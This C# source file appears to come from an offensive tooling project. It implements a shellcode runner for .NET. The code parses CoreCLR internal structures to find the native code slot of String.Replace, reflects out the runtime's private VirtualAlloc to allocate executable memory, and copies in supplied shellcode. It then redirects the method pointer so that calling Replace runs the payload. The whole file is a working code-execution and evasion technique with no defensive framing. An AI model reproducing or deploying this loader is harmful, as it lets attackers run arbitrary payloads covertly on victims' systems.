using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace NautilusProject
{
    public class ExecNativeSlot
    {
        public static void Execute(byte[] shellcode)
        {
            var list2 = "HELLO";
            var t = typeof(System.String);
            var mt = Marshal.PtrToStructure<Internals.MethodTable>(t.TypeHandle.Value);
            var ec = Marshal.PtrToStructure<Internals.EEClass>(mt.m_pEEClass);
            var mdc = Marshal.PtrToStructure<Internals.MethodDescChunk>(ec.m_pChunks);
            var md = Marshal.PtrToStructure<Internals.MethodDesc>(ec.m_pChunks + 0x18);

            if ((md.m_wFlags & Internals.mdcHasNonVtableSlot) != Internals.mdcHasNonVtableSlot)
            {
                Console.WriteLine("[x] Error: mdcHasNonVtableSlot not set for this MethodDesc");
                return;
            }

            if ((md.m_wFlags & Internals.mdcHasNativeCodeSlot) != Internals.mdcHasNativeCodeSlot)
            {
                Console.WriteLine("[x] Error: mdcHasNativeCodeSlot not set for this MethodDesc");
                return;
            }

            // Trigger Jit of String.Replace method
            list2.Replace("XPN", "WAZ'ERE", true, null);

            // Get the String.Replace method native code pointer
            IntPtr nativeCodePointer = Marshal.ReadIntPtr(ec.m_pChunks + 0x18 + 0x10);

            // Steal p/invoke from CoreCLR Interop.Kernel32.VirtualAlloc
            var kernel32 = typeof(System.String).Assembly.GetType("Interop+Kernel32");
            var VirtualAlloc = kernel32.GetMethod("VirtualAlloc", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);

            // Allocate memory
            var ptr = VirtualAlloc.Invoke(null, new object[] { IntPtr.Zero, new UIntPtr((uint)shellcode.Length), Internals.AllocationType.Commit | Internals.AllocationType.Reserve, Internals.MemoryProtection.ExecuteReadWrite });

            // Convert void* to IntPtr
            IntPtr mem = (IntPtr)ptr.GetType().GetMethod("GetPointerValue", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(ptr, new object[] { });

            Marshal.Copy(shellcode, 0, mem, shellcode.Length);

            // Point the native code pointer to our shellcode directly
            Marshal.WriteIntPtr(ec.m_pChunks + 0x18 + 0x10, mem);

            // Charging Ma Laz0r...
            System.Threading.Thread.Sleep(1000);

            // FIRE!!
            "AAAA".Replace("XPN", "WAZ'ERE", true, null);
        }

        public static class Internals
        {
            [StructLayout(LayoutKind.Explicit)]
            public struct MethodTable
            {
                [FieldOffset(0)]
                public uint m_dwFlags;

                [FieldOffset(0x4)]
                public uint m_BaseSize;

                [FieldOffset(0x8)]
                public ushort m_wFlags2;

                [FieldOffset(0x0a)]
                public ushort m_wToken;

                [FieldOffset(0x0c)]
                public ushort m_wNumVirtuals;

                [FieldOffset(0x0e)]
                public ushort m_wNumInterfaces;

                [FieldOffset(0x10)]
                public IntPtr m_pParentMethodTable;

                [FieldOffset(0x18)]
                public IntPtr m_pLoaderModule;

                [FieldOffset(0x20)]
                public IntPtr m_pWriteableData;

                [FieldOffset(0x28)]
                public IntPtr m_pEEClass;

                [FieldOffset(0x30)]
                public IntPtr m_pPerInstInfo;

                [FieldOffset(0x38)]
                public IntPtr m_pInterfaceMap;
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct EEClass
            {
                [FieldOffset(0)]
                public IntPtr m_pGuidInfo;

                [FieldOffset(0x8)]
                public IntPtr m_rpOptionalFields;

                [FieldOffset(0x10)]
                public IntPtr m_pMethodTable;

                [FieldOffset(0x18)]
                public IntPtr m_pFieldDescList;

                [FieldOffset(0x20)]
                public IntPtr m_pChunks;
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct MethodDescChunk
            {
                [FieldOffset(0)]
                public IntPtr m_methodTable;

                [FieldOffset(8)]
                public IntPtr m_next;

                [FieldOffset(0x10)]
                public byte m_size;

                [FieldOffset(0x11)]
                public byte m_count;

                [FieldOffset(0x12)]
                public byte m_flagsAndTokenRange;
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct MethodDesc
            {
                [FieldOffset(0)]
                public ushort m_wFlags3AndTokenRemainder;

                [FieldOffset(2)]
                public byte m_chunkIndex;

                [FieldOffset(0x3)]
                public byte m_bFlags2;

                [FieldOffset(0x4)]
                public ushort m_wSlotNumber;

                [FieldOffset(0x6)]
                public ushort m_wFlags;

                [FieldOffset(0x8)]
                public IntPtr TempEntry;
            }

            public const int mdcHasNonVtableSlot = 0x0008;
            public const int mdcHasNativeCodeSlot = 0x0020;

            [Flags]
            public enum AllocationType
            {
                Commit = 0x1000,
                Reserve = 0x2000,
                Decommit = 0x4000,
                Release = 0x8000,
                Reset = 0x80000,
                Physical = 0x400000,
                TopDown = 0x100000,
                WriteWatch = 0x200000,
                LargePages = 0x20000000
            }

            [Flags]
            public enum MemoryProtection
            {
                Execute = 0x10,
                ExecuteRead = 0x20,
                ExecuteReadWrite = 0x40,
                ExecuteWriteCopy = 0x80,
                NoAccess = 0x01,
                ReadOnly = 0x02,
                ReadWrite = 0x04,
                WriteCopy = 0x08,
                GuardModifierflag = 0x100,
                NoCacheModifierflag = 0x200,
                WriteCombineModifierflag = 0x400
            }
        }
    }
}